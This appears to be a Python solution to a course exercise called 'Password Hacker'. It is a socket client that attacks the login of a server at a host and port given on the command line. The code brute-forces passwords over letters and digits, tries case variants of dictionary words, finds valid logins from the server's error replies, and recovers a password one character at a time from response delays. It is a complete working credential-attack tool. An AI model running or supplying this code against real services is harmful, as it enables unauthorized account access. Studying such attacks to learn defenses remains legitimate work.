import argparse
import itertools
import json
import string
from datetime import datetime
from pathlib import Path
from socket import socket


class SocketHacker:
    def __init__(self, connection_params, passwords_file="passwords.txt", logins_file="logins.txt") -> None:
        self.connection_params = connection_params
        self.socket = socket()
        self.connect()
        self.dictionary = self._load_file(file_name=passwords_file)
        self.logins = self._load_file(file_name=logins_file)

    def connect(self) -> None:
        self.socket.connect((self.connection_params["host"],
                             self.connection_params["port"]))

    def send(self, data: str) -> None:
        self.socket.send(data.encode())

    def print_message(self):
        print(self._receive())

    def send_json(self, dict_for_send: dict):
        self.send(json.dumps(dict_for_send))

    def json_brute_force(self):
        """ Tasks 4-5 """
        password = ""
        for login in self.logins:
            self.send_json({
                "login": login,
                "password": password
            })
            answer = json.loads(self._receive())
            if answer["result"] == "Wrong password!":
                break
        letters = string.ascii_letters + string.digits
        password = ""
        for number in range(1, 10):
            for letter in letters:
                current_password = f'{password}{letter}'
                self.send_json({
                    "login": login,
                    "password": current_password
                })
                start = datetime.now()
                answer = json.loads(self._receive())
                time_delta = datetime.now() - start
                if "Wrong password!" in answer["result"] and time_delta.microseconds >= 90000:
                    password = password + letter
                    break
                elif "Connection success!" in answer["result"]:
                    return json.dumps({"login": login,
                                       "password": current_password})

    def _load_file(self, file_name: str):
        full_path = Path(Path.cwd(), file_name)
        with open(full_path, mode="r", encoding="utf-8") as dict_file:
            return dict_file.read().split("\n")

    def brute_force_with_dictionary(self, file_name="passwords.txt"):
        """ Task 3 """
        self.dictionary = self._load_file(file_name=file_name)
        for word in self.dictionary:
            for password in map(lambda x: ''.join(x),
                                itertools.product(*([letter.lower(), letter.upper()] for letter in word))):

                self.send(data=password)
                response = self._receive()
                if response == "Connection success!":
                    return password

    def brute_force(self):
        """ Task 2 """
        line = string.ascii_lowercase + string.digits
        for length in range(1, 10):
            for password_var in itertools.product(line, repeat=length):
                password = "".join(password_var)
                self.send(data=password)
                response = self._receive()
                if response == "Connection success!":
                    return password
                elif response == "Too many attempts":
                    return password

    def _receive(self) -> str:
        return self.socket.recv(1024).decode()

    def close_connection(self):
        self.socket.close()

    def __enter__(self):
        return self

    def __exit__(self, *args, **kwargs):
        self.close_connection()


def parse_params():
    parser = argparse.ArgumentParser(
        description="Project: Password Hacker")
    parser.add_argument(
        "host",
        help="Host for connection")
    parser.add_argument(
        "port",
        help="Port for connection")
    parser.add_argument(
        "--password",
        help="Password for connection")
    args = parser.parse_args()
    return {
        "host": args.host,
        "port": int(args.port),
        "password": args.password,
    }


def main():
    script_params = parse_params()
    with SocketHacker(connection_params=script_params) as socket_hacker:
        print(socket_hacker.json_brute_force())


if __name__ == '__main__':
    main()
